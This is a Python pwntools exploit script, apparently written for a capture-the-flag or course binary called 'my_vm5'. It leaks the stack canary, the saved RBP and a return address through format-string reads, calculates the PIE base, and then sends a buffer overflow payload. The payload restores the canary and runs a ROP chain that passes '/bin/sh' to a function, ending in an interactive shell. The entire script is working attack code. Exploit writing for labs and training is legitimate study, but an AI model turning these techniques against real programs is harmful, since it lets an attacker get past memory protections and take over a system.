#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

import sys

# Set up pwntools for the correct architecture
exe = context.binary = ELF(sys.argv[1] or "../ref/bin/my_vm5")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
b *vuln_function+771
c
c
c
c
x/180gx $rsp
""".format(
    **locals()
)

io = start()

# resolve canary address
io.sendline(b"PRINTS %43$p")
io.sendline(b"EXEC")
canary = io.recvline_regex("0x[0-9a-f]+")
print(f"CANARY => {canary}")

# resolve base address
# 1. leak address of vuln_function
io.sendline(b"PRINTS %45$p")  # leak return address
io.sendline(b"EXEC")

# 2. calculate base address (should end in 000)
base_address = int(io.recvline_regex("0x[0-9a-f]+"), 16) - 0x340F  # static offset
exe.address = base_address

# get function address
pwn_func5 = exe.symbols["pwn_func5"]

# resolve RBP address
io.sendline(b"PRINTS %44$p")
io.sendline(b"EXEC")
rbp = int(io.recvline_regex("0x[0-9a-f]+"), 16)
print(f"RBP => {rbp}")

# create payload
rop = ROP(exe)

rop.raw(b"PRINTS ")  # instruction
rop.raw(b"\xFF" * 264)  # padding
rop.raw(p64(int(canary, 16)))  # override canary
rop.raw(p64(rbp))  # override RBP
rop.raw(rop.ret)
rop.raw(rop.rdi.address)  # ROP gadget => pop rdi; ret
rop.raw(p64(rbp + (8 + 8 + 8 + 64 + 8 + 8 + 8)))  # = (char**)$"/bin/sh" address
rop.raw(pwn_func5)  # ROP
rop.raw(b"\xFF" * 64)
rop.raw(b"/bin/sh\x00")  # executable path
rop.raw(p64(rbp + (8 + 8 + 8 + 64 + 8 + 8)))  # = (char*)$"/bin/sh"
rop.raw(p64(0))

print("ROP : ")
print(rop.dump())

payload = rop.chain()

io.sendline(payload)
io.sendline(b"EXEC")

io.interactive()
